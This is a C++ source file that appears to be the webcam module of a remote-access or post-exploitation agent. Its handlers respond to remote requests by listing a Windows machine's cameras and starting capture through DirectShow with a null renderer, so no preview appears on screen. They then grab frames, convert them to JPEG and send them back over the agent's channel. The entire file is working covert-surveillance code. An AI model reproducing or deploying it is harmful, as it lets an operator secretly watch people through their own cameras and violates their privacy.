//This software is based on Touchless, which is released under the Microsoft Public License (Ms-PL) 
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <dshow.h>
#pragma comment(lib, "strmiids")
extern "C" {
#include "../../common/common.h"
#include "main.h"
#include "video.h"
#include "bmp2jpeg.h"
}

//Required interface stuff - bad hack for qedit.h not being present/compatible with later windows versions
interface ISampleGrabberCB : public IUnknown {
	virtual STDMETHODIMP SampleCB( double SampleTime, IMediaSample *pSample ) = 0;
	virtual STDMETHODIMP BufferCB( double SampleTime, BYTE *pBuffer, long BufferLen ) = 0;
};
static const IID IID_ISampleGrabberCB = { 0x0579154A, 0x2B53, 0x4994, { 0xB0, 0xD0, 0xE7, 0x73, 0x14, 0x8E, 0xFF, 0x85 } };
interface ISampleGrabber : public IUnknown {
	virtual HRESULT STDMETHODCALLTYPE SetOneShot( BOOL OneShot ) = 0;
	virtual HRESULT STDMETHODCALLTYPE SetMediaType( const AM_MEDIA_TYPE *pType ) = 0;
	virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType( AM_MEDIA_TYPE *pType ) = 0;
	virtual HRESULT STDMETHODCALLTYPE SetBufferSamples( BOOL BufferThem ) = 0;
	virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer( long *pBufferSize, long *pBuffer ) = 0;
	virtual HRESULT STDMETHODCALLTYPE GetCurrentSample( IMediaSample **ppSample ) = 0;
	virtual HRESULT STDMETHODCALLTYPE SetCallback( ISampleGrabberCB *pCallback, long WhichMethodToCallback ) = 0;
};
static const IID IID_ISampleGrabber = { 0x6B652FFF, 0x11FE, 0x4fce, { 0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F } };
static const CLSID CLSID_SampleGrabber = { 0xC1F400A0, 0x3F08, 0x11d3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };
static const CLSID CLSID_NullRenderer = { 0xC1F400A4, 0x3F08, 0x11d3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };

//Handle used for synchronization. Main thread waits for capture event to be signalled to clean up
HANDLE writeEvent;

//Store width/height of captured frame
int nWidth;
int nHeight;
bool running = false;

//Capture variables
#define MAX_CAMERAS		10
IGraphBuilder* g_pGraphBuilder = NULL;
IMediaControl* g_pMediaControl = NULL;
ICaptureGraphBuilder2* g_pCaptureGraphBuilder = NULL;
IBaseFilter* g_pIBaseFilterCam = NULL;
IBaseFilter* g_pIBaseFilterSampleGrabber = NULL;
IBaseFilter* g_pIBaseFilterNullRenderer = NULL;

PBYTE imgdata = NULL;
long imgsize = 0;
UINT bmpsize = 0;
PBYTE bmpdata = NULL;
DWORD jpgsize = 0;
PBYTE jpgarray = NULL; //shouldn't be bigger, right?

// SampleGrabber callback interface
class MySampleGrabberCB : public ISampleGrabberCB{
public:
	MySampleGrabberCB(){
		m_nRefCount = 0;
	}
	virtual HRESULT STDMETHODCALLTYPE SampleCB( 
            double SampleTime,
            IMediaSample *pSample){
		 return E_FAIL;
	 }
     virtual HRESULT STDMETHODCALLTYPE BufferCB( 
            double SampleTime,
            BYTE *pBuffer,
            long BufferLen) {
		if (imgdata == NULL || imgsize < BufferLen){
			imgsize = BufferLen;
			if(imgdata != NULL)
				free(imgdata);
			imgdata = (PBYTE)malloc(imgsize);
		}
		memcpy(imgdata,pBuffer,imgsize);
		SetEvent(writeEvent); //Notify of new frame
		return S_OK;
	 }
	virtual HRESULT STDMETHODCALLTYPE QueryInterface( 
            REFIID riid,
            void **ppvObject) {
		 return E_FAIL;  // Not a very accurate implementation
	 }
	virtual ULONG STDMETHODCALLTYPE AddRef(){
		return ++m_nRefCount;
	}
	virtual ULONG STDMETHODCALLTYPE Release(){
		int n = --m_nRefCount;
		if (n <= 0)
			delete this;
		return n;
	}
private:
	int m_nRefCount;
};

extern "C" {
// lists webcams
DWORD request_webcam_list(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;

	do{
		IEnumMoniker* pclassEnum = NULL;
		ICreateDevEnum* pdevEnum = NULL;
		
		CoInitialize(NULL);
		HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, 
				NULL, 
				CLSCTX_INPROC, 
				IID_ICreateDevEnum, 
				(LPVOID*)&pdevEnum);

		if (SUCCEEDED(hr))
			hr = pdevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pclassEnum, 0);

		if (pdevEnum != NULL){
			pdevEnum->Release();
			pdevEnum = NULL;
		}
		int nCount = 0;
		IUnknown* pUnk = NULL;
		if (pclassEnum == NULL)
			break;// Error!

		IMoniker* apIMoniker[1];
		ULONG ulCount = 0;
		while (SUCCEEDED(hr) && nCount < MAX_CAMERAS && pclassEnum->Next(1, apIMoniker, &ulCount) == S_OK){
			IPropertyBag *pPropBag;
			hr = apIMoniker[0]->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pPropBag);
			if (SUCCEEDED(hr)) {
				// To retrieve the filter's friendly name, do the following:
				VARIANT varName;
				VariantInit(&varName);
				hr = pPropBag->Read(L"FriendlyName", &varName, 0);
				//get chars from wchars
				size_t converted;
				char charbuf[512];
				wcstombs_s(&converted, charbuf, sizeof(charbuf), varName.bstrVal, sizeof(charbuf));
				if (SUCCEEDED(hr) && varName.vt == VT_BSTR)
					packet_add_tlv_string(response, TLV_TYPE_WEBCAM_NAME, charbuf);
				VariantClear(&varName);
				pPropBag->Release();
			}
			nCount++;
		}
		pclassEnum->Release();
		if(pUnk == NULL)
			break;// No webcam!
	} while (0);

	dwResult = GetLastError();
	packet_transmit_response(dwResult, remote, response);
	return dwResult;
}

// Starts webcam
DWORD request_webcam_start(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
	UINT index = packet_get_tlv_value_uint(packet, TLV_TYPE_WEBCAM_INTERFACE_ID);

	do {
		if(running)
			BREAK_WITH_ERROR("Already running!", ERROR_SERVICE_ALREADY_RUNNING)
		IEnumMoniker* pclassEnum = NULL;
		ICreateDevEnum* pdevEnum = NULL;
		if(index < 1)
			BREAK_WITH_ERROR("No webcams found", ERROR_FILE_NOT_FOUND)
		CoInitialize(NULL);
		HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, 
				NULL, 
				CLSCTX_INPROC, 
				IID_ICreateDevEnum, 
				(LPVOID*)&pdevEnum);
		if (FAILED(hr))
			BREAK_WITH_ERROR("No webcams found", hr)

		hr = pdevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pclassEnum, 0);

		if (pdevEnum != NULL){
			pdevEnum->Release();
			pdevEnum = NULL;
		}
		UINT nCount = 0;
		IUnknown* pUnk = NULL;
		if (pclassEnum == NULL)
			break;// Error!
		IMoniker* apIMoniker[1];
		ULONG ulCount = 0;
		while (SUCCEEDED(hr) && nCount < index && pclassEnum->Next(1, apIMoniker, &ulCount) == S_OK){
			pUnk = apIMoniker[0];
			nCount++;
		}
		pclassEnum->Release();
		if(pUnk == NULL)
			BREAK_WITH_ERROR("No webcams found", ERROR_FILE_NOT_FOUND)
		IMoniker *pMoniker = NULL;

		// Grab the moniker interface
		hr = pUnk->QueryInterface(IID_IMoniker, (LPVOID*)&pMoniker);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Query interface failed", hr)

		// Build all the necessary interfaces to start the capture
		hr = CoCreateInstance(CLSID_FilterGraph, 
			NULL, 
			CLSCTX_INPROC, 
			IID_IGraphBuilder, 
			(LPVOID*)&g_pGraphBuilder);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Filter graph creation failed", hr)

		hr = g_pGraphBuilder->QueryInterface(IID_IMediaControl, (LPVOID*)&g_pMediaControl);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Query interface failed", hr)

		hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, 
			NULL, 
			CLSCTX_INPROC, 
			IID_ICaptureGraphBuilder2, 
			(LPVOID*)&g_pCaptureGraphBuilder);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Capture Graph Builder failed", hr)

		// Setup the filter graph
		hr = g_pCaptureGraphBuilder->SetFiltergraph(g_pGraphBuilder);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Set filter graph failed", hr)
		// Build the camera from the moniker
		hr = pMoniker->BindToObject(NULL, NULL, IID_IBaseFilter, (LPVOID*)&g_pIBaseFilterCam);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Bind to object failed", hr)
		// Add the camera to the filter graph
		hr = g_pGraphBuilder->AddFilter(g_pIBaseFilterCam, L"WebCam");
		if (FAILED(hr))
			BREAK_WITH_ERROR("Add filter failed", hr)
		// Create a SampleGrabber
		hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&g_pIBaseFilterSampleGrabber);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Create sample grabber failed", hr)
		// Configure the Sample Grabber
		ISampleGrabber *pGrabber = NULL;
		hr = g_pIBaseFilterSampleGrabber->QueryInterface(IID_ISampleGrabber, (void**)&pGrabber);
		if (SUCCEEDED(hr)){
			AM_MEDIA_TYPE mt;
			ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
			mt.majortype = MEDIATYPE_Video;
			mt.subtype = MEDIASUBTYPE_RGB24;
			mt.formattype = FORMAT_VideoInfo;
			hr = pGrabber->SetMediaType(&mt);
		}
		if (SUCCEEDED(hr)){
			MySampleGrabberCB* msg = new MySampleGrabberCB();
			hr = pGrabber->SetCallback(msg, 1);
		}
		if (pGrabber != NULL){
			pGrabber->Release();
			pGrabber = NULL;
		}
		if (FAILED(hr))
			BREAK_WITH_ERROR("Sample grabber instantiation failed", hr)

		// Add Sample Grabber to the filter graph
		hr = g_pGraphBuilder->AddFilter(g_pIBaseFilterSampleGrabber, L"SampleGrabber");
		if (FAILED(hr))
			BREAK_WITH_ERROR("Add Sample Grabber to the filter graph failed", hr)
		// Create the NullRender
		hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&g_pIBaseFilterNullRenderer);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Create the NullRender failed", hr)
		// Add the Null Render to the filter graph
		hr = g_pGraphBuilder->AddFilter(g_pIBaseFilterNullRenderer, L"NullRenderer");
		if (FAILED(hr))
			BREAK_WITH_ERROR("Add the Null Render to the filter graph failed", hr)
		// Configure the render stream
		hr = g_pCaptureGraphBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, g_pIBaseFilterCam,
					g_pIBaseFilterSampleGrabber, g_pIBaseFilterNullRenderer);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Configure the render stream failed", hr)
		// Grab the capture width and height
		hr = g_pIBaseFilterSampleGrabber->QueryInterface(IID_ISampleGrabber, (LPVOID*)&pGrabber);
		if (FAILED(hr))
			BREAK_WITH_ERROR("Querying interface failed", hr)
		AM_MEDIA_TYPE mt;
		hr = pGrabber->GetConnectedMediaType(&mt);
		if (FAILED(hr))
			BREAK_WITH_ERROR("GetConnectedMediaType failed", hr)
		VIDEOINFOHEADER *pVih;
		if ((mt.formattype == FORMAT_VideoInfo) && 
			(mt.cbFormat >= sizeof(VIDEOINFOHEADER)) &&
			(mt.pbFormat != NULL) ) {
			pVih = (VIDEOINFOHEADER*)mt.pbFormat;
			nWidth = pVih->bmiHeader.biWidth;
			nHeight = pVih->bmiHeader.biHeight;
		}else{
			BREAK_WITH_ERROR("Wrong format type", hr) // Wrong format
		}
		if (pGrabber != NULL){
			pGrabber->Release();
			pGrabber = NULL;
		}

		//Sync: set up semaphore
		writeEvent = CreateEvent( 
			NULL,               // default security attributes
			FALSE,               // auto-reset event
			FALSE,              // initial state is nonsignaled
			NULL);  // no object name

		// Start the capture
		if (FAILED(hr))
			BREAK_WITH_ERROR("CreateEvent failed", hr)
		hr = g_pMediaControl->Run();
		if (FAILED(hr))
			BREAK_WITH_ERROR("Running capture failed", hr)

		// Cleanup
		if (pMoniker != NULL){
			pMoniker->Release();
			pMoniker = NULL;
		}

		//Now we wait for first frame
		if(WaitForSingleObject (writeEvent, 30000) == WAIT_TIMEOUT)
			BREAK_WITH_ERROR("timeout!", WAIT_TIMEOUT);
		running = true;
		dwResult = GetLastError();
	} while (0);

	packet_transmit_response(dwResult, remote, response);
	return dwResult;
}

// Gets image from running webcam
DWORD request_webcam_get_frame(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
	UINT quality = packet_get_tlv_value_uint(packet, TLV_TYPE_WEBCAM_QUALITY);
	
	//Make bmp
	BITMAPFILEHEADER	bfh;
	bfh.bfType = 0x4d42;	// always "BM"
	bfh.bfSize = sizeof( BITMAPFILEHEADER );
	bfh.bfReserved1 = 0;
	bfh.bfReserved2 = 0;
	bfh.bfOffBits = (DWORD) (sizeof( bfh ) + sizeof(BITMAPINFOHEADER));

	BITMAPINFOHEADER bih;
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = nWidth;
	bih.biHeight = nHeight;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage = imgsize;
	bih.biXPelsPerMeter = 0;
	bih.biYPelsPerMeter = 0;
	bih.biClrUsed = 0;
	bih.biClrImportant = 0;

	UINT mybmpsize = imgsize + sizeof(bfh) + sizeof(bih);
	if(bmpsize < mybmpsize){
		bmpsize = mybmpsize;
		if(bmpdata != NULL)
			delete [] bmpdata;
		bmpdata = new BYTE[bmpsize];
	}

	// put headers together to make a .bmp in memory
	memcpy(bmpdata, &bfh, sizeof(bfh));
	memcpy(bmpdata + sizeof(bfh), &bih, sizeof(bih));
	memcpy(bmpdata + sizeof(bfh) + sizeof(bih), imgdata, imgsize);

	// Now convert to JPEG
	bmp2jpeg(bmpdata, quality, &jpgarray, &jpgsize );

	//And send
	packet_add_tlv_raw(response, TLV_TYPE_WEBCAM_IMAGE, jpgarray, jpgsize);
	packet_transmit_response(dwResult, remote, response);

	PBYTE tmparray = jpgarray;
	jpgsize = 0;
	jpgarray = NULL;
	free(tmparray);
	return dwResult;
}

// Stops running webcam
DWORD request_webcam_stop(Remote *remote, Packet *packet){
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;

	running = false;
	if (g_pMediaControl != NULL){
		g_pMediaControl->Stop();
		g_pMediaControl->Release();
		g_pMediaControl = NULL;
	}
	if (g_pIBaseFilterNullRenderer != NULL){
		g_pIBaseFilterNullRenderer->Release();
		g_pIBaseFilterNullRenderer = NULL;
	}
	if (g_pIBaseFilterSampleGrabber != NULL){
		g_pIBaseFilterSampleGrabber->Release();
		g_pIBaseFilterSampleGrabber = NULL;
	}
	if (g_pIBaseFilterCam != NULL){
		g_pIBaseFilterCam->Release();
		g_pIBaseFilterCam = NULL;
	}
	if (g_pGraphBuilder != NULL){
		g_pGraphBuilder->Release();
		g_pGraphBuilder = NULL;
	}
	if (g_pCaptureGraphBuilder != NULL){
		g_pCaptureGraphBuilder->Release();
		g_pCaptureGraphBuilder = NULL;
	}

	packet_transmit_response(dwResult, remote, response);
	return dwResult;
}

}
